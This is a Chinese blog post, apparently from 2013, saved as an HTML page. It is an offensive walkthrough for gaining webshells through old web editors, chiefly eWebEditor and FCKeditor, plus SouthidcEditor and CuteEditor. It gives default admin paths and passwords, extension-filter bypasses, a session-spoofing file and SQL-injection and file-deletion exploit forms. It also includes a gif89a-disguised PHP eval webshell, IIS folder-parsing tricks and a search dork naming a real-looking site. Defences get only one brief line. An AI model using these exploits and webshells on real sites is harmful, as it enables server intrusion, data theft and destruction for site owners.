@@ -1,0 +1,504 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
+  <title>常见的一些编辑器漏洞 | 双人份 Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="常见的一些编辑器:ewebeditor ewebeditornet fckeditoreditor southidceditor SouthidcEditor bigcneditor
+其实如果大家多关注编辑器的话,会有惊人的发现,尤其是jsp,php版的,一个webshell基本上就是一台服务器啊~~~
+一:首先说说最近不断爆洞的ewebeditor
+(一)ASP版1:默认管理后台:
+http:/">
+<meta property="og:type" content="article">
+<meta property="og:title" content="常见的一些编辑器漏洞">
+<meta property="og:url" content="http://doubles.me/2013/02/08/376/index.html">
+<meta property="og:site_name" content="双人份 Blog">
+<meta property="og:description" content="常见的一些编辑器:ewebeditor ewebeditornet fckeditoreditor southidceditor SouthidcEditor bigcneditor
+其实如果大家多关注编辑器的话,会有惊人的发现,尤其是jsp,php版的,一个webshell基本上就是一台服务器啊~~~
+一:首先说说最近不断爆洞的ewebeditor
+(一)ASP版1:默认管理后台:
+http:/">
+<meta property="og:updated_time" content="2016-07-05T19:55:00.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="常见的一些编辑器漏洞">
+<meta name="twitter:description" content="常见的一些编辑器:ewebeditor ewebeditornet fckeditoreditor southidceditor SouthidcEditor bigcneditor
+其实如果大家多关注编辑器的话,会有惊人的发现,尤其是jsp,php版的,一个webshell基本上就是一台服务器啊~~~
+一:首先说说最近不断爆洞的ewebeditor
+(一)ASP版1:默认管理后台:
+http:/">
+  
+    <link rel="alternative" href="/rss.xml" title="双人份 Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img src="http://7xnueu.com1.z0.glb.clouddn.com/avatar.jpg" class="js-avatar" style="width: 100%;height: 100%;opacity: 1;">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/">双人份</a></h1>
+		</hgroup>
+
+		
+		
+		<!--Search Box-->
+
+
+		<div id="Search">
+			<form onsubmit="dispatch()" >
+
+			<input type="text" maxlength="40" name="q" id="q" value="" placeholder="Search..." style = "width:180 px; height: 22px;">
+			</form>
+		</div>
+		
+<script type="text/javascript">
+
+function dispatch() {
+    var q = document.getElementById("q");
+    if (q.value != "") {
+        var url = 'https://www.google.com/search?q=site:doubles.me%20' + q.value;
+
+        window.open(url, "_blank");
+        
+        return false;
+    } else {
+        return false;
+    }
+}
+</script>
+
+        
+
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">主页</a></li>
+				        
+							<li><a href="/archives">归档</a></li>
+				        
+							<li><a href="/about">关于</a></li>
+				        
+							<li><a href="/links">友链</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+								<a class="github" target="_blank" href="https://github.com/DoubleShift" title="github">github</a>
+					        
+								<a class="weibo" target="_blank" href="https://weibo.com/agmol" title="weibo">weibo</a>
+					        
+								<a class="rss" target="_blank" href="http://doubles.me/rss.xml" title="rss">rss</a>
+					        
+								<a class="mail" target="_blank" href="/fjjwlzd#163.com" title="mail">mail</a>
+					        
+						</div>
+					</nav>
+				</section>
+				
+				
+				
+				
+
+				
+			</div>
+		</div>
+	</header>				
+</div>
+
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide">双人份</h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+			
+				<img src="http://7xnueu.com1.z0.glb.clouddn.com/avatar.jpg" class="js-avatar" style="width: 100%;height: 100%;opacity: 1;">
+			
+			</div>
+			<hgroup>
+			  <h1 class="header-author">双人份</h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主页</a></li>
+		        
+					<li><a href="/archives">归档</a></li>
+		        
+					<li><a href="/about">关于</a></li>
+		        
+					<li><a href="/links">友链</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+						<a class="github" target="_blank" href="https://github.com/DoubleShift" title="github">github</a>
+			        
+						<a class="weibo" target="_blank" href="https://weibo.com/agmol" title="weibo">weibo</a>
+			        
+						<a class="rss" target="_blank" href="http://doubles.me/rss.xml" title="rss">rss</a>
+			        
+						<a class="mail" target="_blank" href="/fjjwlzd#163.com" title="mail">mail</a>
+			        
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+
+      <div class="body-wrap"><article id="post-376" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2013/02/08/376/" class="article-date">
+  	<time datetime="2013-02-08T20:21:33.000Z" itemprop="datePublished">2013-02-08</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      常见的一些编辑器漏洞
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hack/">hack</a></li></ul>
+	</div>
+
+        
+	<div class="article-category tagcloud">
+	<a class="article-category-link" href="/categories/Hack/">Hack</a>
+	</div>
+
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>常见的一些编辑器:ewebeditor ewebeditornet fckeditoreditor southidceditor SouthidcEditor bigcneditor</p>
+<p>其实如果大家多关注编辑器的话,会有惊人的发现,尤其是jsp,php版的,一个webshell基本上就是一台服务器啊~~~</p>
+<p>一:首先说说最近不断爆洞的ewebeditor</p>
+<p>(一)ASP版<br>1:默认管理后台:</p>
+<p><a><a href="http://www.test.com/ewebeditor/admin_login.asp" target="_blank" rel="external">http://www.test.com/ewebeditor/admin_login.asp</a></a></p>
+<p>后台如果能进入:</p>
+<p>可点击样式管理:</p>
+<p>standard 拷贝一份(直接修改改不了)</p>
+<p>在拷贝的一份里加入图片类型( asa aaspsp ) 然后点预览</p>
+<p>在编辑器里点设计 然后直接上传asa大马.</p>
+<p>上传后 在代码里可以看到马的位置!</p>
+<p>(原理:因为在iis里 网站的属性里 应用程序配置一项 asa扩展名还是用asp.dll来解析的,asp也是 还有 cer cdx )</p>
+<p>在cer cdx asa的被删掉 那么马儿就找不到 映射不过去.</p>
+<p>可以在拷贝过后的样式 图片类型里加入 aaspsp 然后在上传 直接就可以上传asp文件<br>2:下载默认数据库</p>
+<p><a>www.test.com/ewebeditor/db/ewebeditor.mdb</a></p>
+<p>然后分析数据库</p>
+<p>webeditor_system(1) 就可以看到用户名和密码 如果破解不出来</p>
+<p>可以在webeditor_style(14 样式表里</p>
+<p>主要看允许上传文件的扩展名(s-fileext s_ingeext)</p>
+<p>看到一个小黑客曾经搞过 多了asa aaspsp</p>
+<p>可以用他来利用!(后台找不到的情况下也可以用此方法)</p>
+<p>可以构造语句:</p>
+<p>比如 ID=46 s-name =standard1</p>
+<p>构造 代码: ewebeditor.asp?id=content&amp;style=standard</p>
+<p>ID和和样式名改过后</p>
+<p>ewebeditor.asp?id=46&amp;style=standard1<br>然后就是进入编辑器 上传asa 或者asp的 得到webshell</p>
+<p>前面的1跟2说的是asp版的ewebeditor,其他如php,jsp跟asp的差不多,这里不多说.</p>
+<p>针对这种方法可能出现的问题:</p>
+<p>(1)．使用默认用户名和密码无法登录。<br>请试试直接下载db目录下的ewebeditor.mdb文件，用户名和密码在eWebEditor_System表中，经过了md5加密，如果无法下载或者无法</p>
+<p><em>**</em>，那就当自己的运气不好了。<br>(2)．加了asa类型后发现还是无法上传。<br>应该是站长懂点代码，自己修改了Upload.asp文件，但是没有关系，按照常人的思维习惯，往往会直接在sAllowExt = Replace</p>
+<p>(UCase(sAllowExt), “ASP”, “”)一句上修改，我就看见过一个站长是这样修改的：<br>sAllowExt = Replace(Replace(Replace(Replace(Replace(UCase(sAllowExt), “ASP”, “”), “CER”, “”), “ASA”, “”), “CDX”, “”),</p>
+<p>“HTR”, “”)<br>猛一看什么都过滤了，但是我们只要在上传类型中增加“aaspsp”，就可以直接上传asp文件了。呵呵，是不是天才的想法？“aaspsp</p>
+<p>”过滤了“asp”字符后，反而变成了“asp”！顺便告诉大家一个秘密，其实动网论坛7.0 sp2中也可以利用类似的方法绕过对扩展名</p>
+<p>的过滤。<br>(3)．上传了asp文件后，却发现该目录没有运行脚本的权限。<br>呵呵，真是好笨啊，上传类型可以改，上传路径不是也可以修改的吗？</p>
+<p>(4)．已经使用了第2点中的方法，但是asp类型还是无法上传。<br>看来站长肯定是一个写asp的高手，但是我们还有最后一招来对付他：看到“远程类型”了吗？eWebEditor能够设定自动保存远程文件</p>
+<p>的类型，我们可以加入asp类型。但是如何才能让远程访问的asp文件能够以源码形式保存呢？方法是很多的，最简单的方法是将IIS中</p>
+<p>的“应用文件映射”中的“asp”删除。</p>
+<p>漏洞原理<br>漏洞的利用原理很简单，请看Upload.asp文件：<br>任何情况下都不允许上传asp脚本文件<br>sAllowExt = Replace(UCase(sAllowExt), “ASP”, “”)<br>因为eWebEditor仅仅过滤了ASP文件。记得我第一次使用eWebEditor时就在纳闷：既然作者已经知道asp文件需要过滤，为什么不同时</p>
+<p>过滤asa、cer等文件呢？也许这就是对免费用户不负责任的表现吧！</p>
+<p>3.eWebEditor session欺骗漏洞</p>
+<p>eWebEditor在线编辑器</p>
+<p>漏洞文件:Admin_Private.asp</p>
+<p>漏洞语句:&lt;%</p>
+<p>If Session(“eWebEditor_User”) = “” Then</p>
+<p>Response.Redirect “admin_login.asp”</p>
+<p>Response.End</p>
+<p>End If</p>
+<p>只判断了session，没有判断cookies和路径的验证问题。</p>
+<p>漏洞利用:</p>
+<p>新建一个h4x0r.asp内容如下:</p>
+<p>&lt;%Session(“eWebEditor_User”) = “11111111”%&gt;</p>
+<p>访问h4x0r.asp，再访问后台任何文件，for example:Admin_Default.asp</p>
+<p>漏洞影响:虚拟主机的克星.</p>
+<p>4.ewebeditor asp版 2.1.6 上传漏洞</p>
+<p>&lt;H1&gt;ewebeditor asp版 2.1.6 上传漏洞利用程序&lt;/H1&gt;&lt;br&gt;</p>
+<p>&lt;form action=”<a><a href="http://127.1/e/upload.asp?action=save&amp;type=IMAGE&amp;style=luoye" target="_blank" rel="external">http://127.1/e/upload.asp?action=save&amp;type=IMAGE&amp;style=luoye</a>‘</a> union select</p>
+<p>S_ID,S_Name,S_Dir,S_CSS,S_UploadDir,S_Width,S_Height,S_Memo,S_IsSys,S_FileExt,S_FlashExt, [S_ImageExt]%</p>
+<p>2b’|cer’,S_MediaExt,S_FileSize,S_FlashSize,S_ImageSize,S_MediaSize,S_StateFlag,S_DetectFromWord,S_InitMode,S_BaseUrl</p>
+<p>from ewebeditor_style where s_name=’standard’and’a’=’a” method=post name=myform enctype=”multipart/form-data”&gt;</p>
+<p>&lt;input type=file name=uploadfile size=100&gt;&lt;br&gt;&lt;br&gt;</p>
+<p>&lt;input type=submit value=Fuck&gt;</p>
+<p>&lt;/form&gt;</p>
+<p><a><a href="http://127.1/e/upload.asp" target="_blank" rel="external">http://127.1/e/upload.asp</a></a></p>
+<p>上传时修改此处上传地址。。。</p>
+<p>如果你是上传的asp文件则成功后的地址为：</p>
+<p><a><a href="http://127.1/e/uploadfile/xxxxxxxxxx.asp" target="_blank" rel="external">http://127.1/e/uploadfile/xxxxxxxxxx.asp</a></a></p>
+<p>5.ewebeditor遍历路径漏洞<br>Ewebeditor为非常常见的网站核心程序,<br>默认数据库为 /db/ewebeditor.mdb 默认路径admin_login.asp 默认管理员admin密码admin(admin888)</p>
+<p>ewebedit进入后台添加样式.得到webshell很容易. 有时候很不幸.管理员把数据库改为只读权限.</p>
+<p>但是ewebeditor后台有个小小的缺陷. 可以历遍整个网站目录. 当然.数据库为只读的时候一样可以利用.</p>
+<p>上传文件管理—选择样式目录(随便选一个目录)<br>得到:<br>ewebeditor/admin_uploadfile.asp?id=14<br>在id=14后面添加&amp;dir=..<br>再加 &amp;dir=../..<br>&amp;dir=../../../.. 看到整个网站文件了</p>
+<p>6.eweb2.7版本以下又一个注入</p>
+<p>首先看代码(ewebeditor.asp)：<br>ub InitPara()<br>‘ 取全屏标志<br>sFullScreen = Trim(Request.QueryString(“fullscreen”))<br>‘ 取对应的内容ID<br>sContentID = Trim(Request.QueryString(“id”))<br>If sContentID = “” Then ShowErr “请传入调用参数ID，即隐藏的内容表单项ID！”</p>
+<p>‘ 取样式初始值<br>sStyleName = Trim(Request.QueryString(“style”))<br>If sStyleName = “” Then sStyleName = “standard”</p>
+<p>sSql = “select * from ewebeditor_style where s_name=’” &amp; sStyleName &amp; “‘“<br>oRs.Open sSql, oConn, 0, 1<br>If Not oRs.Eof Then<br>sStyleID = oRs(“S_ID”)<br>sStyleName = oRs(“S_Name”)<br>sStyleDir = oRs(“S_Dir”)<br>sStyleCSS = oRs(“S_CSS”)<br>sStyleUploadDir = oRs(“S_UploadDir”)<br>nStateFlag = oRs(“S_StateFlag”)<br>sDetectFromWord = oRs(“S_DetectFromWord”)<br>sInitMode = oRs(“S_InitMode”)<br>sBaseUrl = oRs(“S_BaseUrl”)</p>
+<p>sStyleUploadDir = Replace(sStyleUploadDir, “\”, “/“)<br>If Right(sStyleUploadDir, 1) &lt;&gt; “/“ Then<br>sStyleUploadDir = sStyleUploadDir &amp; “/“<br>End If<br>Else<br>ShowErr “无效的样式Style参数传入，如果要使用默认值，请留空！”<br>End If<br>oRs.Close<br>关键的是这两句：<br>sStyleName = Trim(Request.QueryString(“style”))<br>If sStyleName = “” Then sStyleName = “standard”</p>
+<p>sSql = “select * from ewebeditor_style where s_name=’” &amp; sStyleName &amp; “‘“<br>很明显的是style参数没有足够的过滤，如果我们自己给这个地方赋值的话，程序会报错的，</p>
+<p>但接下来的一句还是让我们有可乘之机，If sStyleName = “” Then sStyleName = “standard”保留默认的还是会带入语句执行，加个</p>
+<p>单引号就报错了，如图2.[local]1[/local]<br>我试了好几款工具，发现只有pangolin可以注入，啊D只能发现注入不能继续猜解。<br>eweb默认的管理员表是：ewebeditor_system<br>这个表下的默认两个列名为:sys_UserName和sys_userpass<br>需要手动添加，</p>
+<p>7.ewebeditor2.8最终版删除任意文件漏洞</p>
+<p>这个漏洞可以很鸡肋，也可以很致命，关键看你怎么利用！</p>
+<p>此漏洞存在于ExampleNewsSystem目录下的delete.asp文件中，这是ewebeditor的测试页面，无须登陆可以直接进入，看这些代码：</p>
+<p>‘ 把带”|”的字符串转为数组<br>Dim aSavePathFileName<br>aSavePathFileName = Split(sSavePathFileName, “|”)<br>‘ 删除新闻相关的文件，从文件夹中<br>Dim i<br>For i = 0 To UBound(aSavePathFileName)<br>‘ 按路径文件名删除文件<br>Call DoDelFile(aSavePathFileName(i))<br>Next</p>
+<p>而aSavePathFileName是前面从数据库取出来的：</p>
+<p>sSavePathFileName = oRs(“D_SavePathFileName”)</p>
+<p>看看D_SavePathFileName是怎么添加到数据库里的，在addsave.asp(modifysave.asp)里：</p>
+<p>sSavePathFileName = GetSafeStr(Request.Form(“d_savepathfilename”))<br>…<br>oRs(“D_SavePathFileName”) = sSavePathFileName</p>
+<p>居然过滤了，是GetSafeStr函数，再看看这个函数，在Startup.asp里：</p>
+<p>Function GetSafeStr(str)<br>GetSafeStr = Replace(Replace(Replace(Trim(str), “‘“, “”), Chr(34), “”), “;”, “”)<br>End Function</p>
+<p>无语，这不是过滤字符型注入的函数么？放这里什么用也没有啊！既然路径没有过滤，那就可以直接定义了，构造一个提交页面，其</p>
+<p>中d_savepathfilename自己任意赋值(要删除多个文件，用|隔开即可)。试试../../eWebEditor.asp，提交后删除该新闻，于是主目录</p>
+<p>下的eWebEditor.asp不见了！</p>
+<p>下面给出利用的htm：<br>&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;eWebEditor删除文件 by:oldjun(<a><a href="http://www.oldjun.com)&lt;/TITLE" target="_blank" rel="external">http://www.oldjun.com)&lt;/TITLE</a></a>&gt;<br>&lt;style&gt;body,p,td,input {font-size:9pt}&lt;/style&gt;<br>&lt;/HEAD&gt;&lt;BODY&gt;&lt;a href=’list.asp’&gt;新闻列表&lt;/a&gt; | &lt;a href=’add.asp’&gt;增加新闻&lt;/a&gt;</p>
+<p>&lt;b&gt;增加新闻&lt;/b&gt;</p>
+<p>&lt;form action=”<a><a href="http://127.0.0.1/editor/Example/NewsSystem/addsave.asp" target="_blank" rel="external">http://127.0.0.1/editor/Example/NewsSystem/addsave.asp</a></a>“<br>method=”post” name=”myform”&gt;<br>&lt;input type=hidden name=d_nofilename&gt;<br>&lt;input type=hidden name=d_savefilename&gt;<br>&lt;table cellspacing=3 align=center&gt;<br>&lt;tr&gt;&lt;td&gt;要删的文件(相对路径就可以了)：&lt;/td&gt;<br>&lt;td&gt;&lt;input type=”text” name=”d_savepathfilename” value=”” size=”90”&gt;&lt;/td&gt;<br>&lt;/tr&gt;<br>&lt;tr&gt;&lt;td&gt;新闻标题(随便填)：&lt;/td&gt;<br>&lt;td&gt;&lt;input type=”text” name=”d_title” value=”” size=”90”&gt;&lt;/td&gt;<br>&lt;/tr&gt;<br>&lt;tr&gt;&lt;td&gt;标题图片：&lt;/td&gt;<br>&lt;td&gt;&lt;select name=”d_picture” size=1&gt;&lt;option value=’’&gt;无&lt;/option&gt;&lt;/select&gt;<br>当编辑区有插入图片时，将自动填充此下拉框&lt;/td&gt;<br>&lt;/tr&gt;<br>&lt;tr&gt;&lt;td&gt;新闻内容(随便填)：&lt;/td&gt;<br>&lt;td&gt;&lt;textarea name=”d_content”&gt;&lt;/textarea&gt;&lt;/td&gt;<br>&lt;/tr&gt;<br>&lt;/table&gt;</p>
+<p>&lt;input type=submit name=btnSubmit value=” 提 交 “&gt;<br>&lt;input type=reset name=btnReset value=” 重 填 “&gt;<br>&lt;/form&gt;<br>&lt;/BODY&gt;&lt;/HTML&gt;</p>
+<p>(二)ASPX版：</p>
+<p>受影响文件：eWebEditorNet/upload.aspx</p>
+<p>利用方法：添好本地的cer的Shell文件。在浏揽器输入javascript:lbtnUpload.click();就能得到shell</p>
+<p>嘿嘿….绕过了限制……成功的上传了ASPX文件….</p>
+<p>文件默认的上传后保存的地址是eWebEditorNet/UploadFile/现在来看看是否上传成功…..</p>
+<p>(三)PHP版</p>
+<p>关于eWebEditor 漏洞php版本的和asp的一样。有目录浏览。和编辑扩展名。重点在于虽然支持了php格式但上传还是上传不了。不过</p>
+<p>利用织梦的gif89a漏洞倒可以实现php一句话上传，然后再上传webshell。</p>
+<p>备注：织梦的gif89a漏洞，准确来说应该是DEDECMS中所用的php版的FCKeditor存在上传漏洞，gif89a文件头欺骗。DEDECMS中在上传</p>
+<p>拖上没有对picSubmit进行任何处理。但是却不能直接上传php马。因为会识别。使用修改过的php小马。</p>
+<p>gif89a</p>
+<p>&lt;?php</p>
+<p>phpinfo();</p>
+<p>?&gt;</p>
+<p>RFI</p>
+<p>gif89a</p>
+<p>&lt;?php</p>
+<p>eval($_POST[c]);</p>
+<p>?&gt;</p>
+<p>利用gif89a进行了欺骗。现在上传就可以成功了.然后有php一句话客户端连接.</p>
+<p>(四)JSP版</p>
+<p>上传漏洞</p>
+<p>影响版本：漏洞存在于ewebeditor jsp版 1.4以下版本，漏洞有两个版本。</p>
+<p>原理：第一个是使用savefile.jsp来进行文件上传操作的，从代码中可以看出，程序并没做任何上传过滤，这样我们就可以直接上传</p>
+<p>一个JSPShell了。另一个版本可能是被人修改过，把代码转成了servlet，不能看到代码，但是利用方法却大同小异。</p>
+<p>利用方法：我们先找一个1.4版本以下的ewebeditor JSP上传页面，选择好一个JSPShell。这个ewebeditor是没有提交按钮的，所以这</p>
+<p>里涉及到一个小技巧，就是在上传的对话框中敲下回车，大约过半分钟，就可以查看网页的源文件来寻找我们的Webshell了。</p>
+<p>这个JSP和PHP一样,如果系统权限没有特意去设置的话,默认我们得到webshell是system的权限,那么…^_^</p>
+<p>二:ewebeditornet 漏洞利用</p>
+<p>默认上传地址:</p>
+<p><a>www.test.com/ewebeditornet/upload.aspx</a><br>可以直接上传一个cer的木马</p>
+<p>在无法上传的情况下</p>
+<p>可以地址栏构造以下代码: javascript:lbtnUpload.click();</p>
+<p>然后查看源代码:</p>
+<p>找到uploadsave 找到地址</p>
+<p>默认传到uploadfile这个文件夹里</p>
+<p>(漏洞修补: 可以在iss里直接把upload文件夹的执行权限选择无. )</p>
+<p>三:fckeditor 漏洞利用</p>
+<p><a><a href="http://www.test.com/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp" target="_blank" rel="external">http://www.test.com/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp</a></a>?</p>
+<p>Command=FileUpload&amp;Type=Image&amp;CurrentFolder=/<br>就把文件名字段改成NEWfile 选择文件名可定义<br>上传过后在/userfiles/image/找文件</p>
+<p>上传任意文件:</p>
+<p>fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/asp/connector.asp</p>
+<p>根据网站所使用不同语言自己改这个地址.</p>
+<p>FCKeditor的JSP版漏洞</p>
+<p><a><a href="http://www.xxx.com/fckeditor/editor/filemanager/browser/default/connectors/jsp/connector" target="_blank" rel="external">http://www.xxx.com/fckeditor/editor/filemanager/browser/default/connectors/jsp/connector</a></a>?</p>
+<p>Command=FileUpload&amp;Type=Image&amp;CurrentFolder=%2F</p>
+<p><a><a href="http://www.xxx.com/fckeditor/editor/filemanager/browser/default/connectors/jsp/connector" target="_blank" rel="external">http://www.xxx.com/fckeditor/editor/filemanager/browser/default/connectors/jsp/connector</a></a>?</p>
+<p>Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=%2F<br>上传shell的地址:<br><a><a href="http://www.xxx.com/fckeditor/editor/filemanager/browser/default/browser.html" target="_blank" rel="external">http://www.xxx.com/fckeditor/editor/filemanager/browser/default/browser.html</a></a>?</p>
+<p>Type=Image&amp;Connector=connectors/jsp/connector</p>
+<p>四：southidceditor</p>
+<p>1.</p>
+<p><a><a href="http://www.xhkjit.com/admin/southidceditor/datas/southidceditor.mdb" target="_blank" rel="external">http://www.xhkjit.com/admin/southidceditor/datas/southidceditor.mdb</a></a></p>
+<p><a><a href="http://www.xhkjit.com/admin/southidceditor/popup.asp" target="_blank" rel="external">http://www.xhkjit.com/admin/southidceditor/popup.asp</a></a></p>
+<p><a><a href="http://www.xhkjit.com/admin/southidceditor/admin/admin_login.asp" target="_blank" rel="external">http://www.xhkjit.com/admin/southidceditor/admin/admin_login.asp</a></a></p>
+<p>2.southidceditor存在一个可以抓包上传的漏洞</p>
+<p>Google:inurl:(admin/SouthidcEditor/PopUp.asp)</p>
+<p>nc抓包自己玩玩吧.<br>五：bigcneditor(这个我没有找到具体的漏洞,网上的文章也都比较不负责任,谁知道的请告诉我下,谢谢)</p>
+<p>这个页不多说了</p>
+<p>原理都差不多！</p>
+<p>防范方法很简单就不多讲了，</p>
+<p>六：CuteEditor编辑器通杀漏洞</p>
+<p>CuteEditor编辑器是.NET下最常用的一个编辑器..<br>十分的强大..也许是因为他太强了 HEHE ..<br>我们随便找到一个装有此编辑器的网站 点击插入图片 FLASH 影音文件 什么的都可以出来一个对话框.<br>在这个对话框里可以游览用户所上传的数据还有目录..郁闷的是居然可以新建..移动..修改..<br>在官网上甚至连删除都弄出来了..呵呵.. 我们这次主要是利用2003服务器的特性来进行利用..<br>大家都知道在2003的IIS环境下 如果你建一个 XXX.asp 文件夹的话 里面不管放什么其他类型的文件<br>在IIS里都会通过文件夹名的类型来解析 也就是说你传一个JPG的东西到 XXX.ASP下也会以ASP脚本<br>来进行解析..我们这里就利用他这一特性…首先我们随便找一个编辑器 然后选择插入图片吧(如图1)..插入其他的<br>东西都行..只要能新建文件目录..或者可以移动目录..</p>
+<p>看这里就有新建文件夹等等一些操作的按钮我们新建一个..如果新建不能用可以试试移动文件夹把以有的文件夹名改成 XXX.asp形</p>
+<p>式..</p>
+<p>好了.我们新建一个 <a>www.asp</a> 文件夹.</p>
+<p>确定..我们的文件夹就建好了..然后点击进入该文件夹 (</p>
+<p>然后到了最关键的…我们上传文件..<br>用插入图片是上传不了的..他会检测是不是正常的图片..<br>可以试试 插入 FLASH<br>或者插入 视频 音乐文件..我们这里就插入视频.. 然后直接把 我们要传上去的马后缀改为 .avi形式<br>然后进入我们刚才新建的那个目录 然后上传 .. 文件就上去了</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2013/02/09/378/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
+        
+          迁移wordpress/网站搬家同时更改URL更改域名
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2013/02/07/370/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">各大Web服务器解析漏洞总结</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+
+
+<div class="duoshuo">
+	<!-- 多说评论框 start -->
+	<div class="ds-thread" data-thread-key="376" data-title="常见的一些编辑器漏洞" data-url="http://doubles.me/2013/02/08/376/"></div>
+	<!-- 多说评论框 end -->
+	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+	<script type="text/javascript">
+	var duoshuoQuery = {short_name:"doubles"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0] 
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+	</script>
+	<!-- 多说公共JS代码 end -->
+</div>
+
+
+
+  
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+
+            
+    	<div class="footer-left">
+    		&copy; 2016 双人份
+    	</div>
+    	<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    	本站总访问量<span id="busuanzi_value_site_pv"></span>次
+
+      <div class="footer-right">
+      		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
+      </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: false,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+<script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script src="/js/main.js"></script>
+
+
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+  </div>
+</body>
+</html>
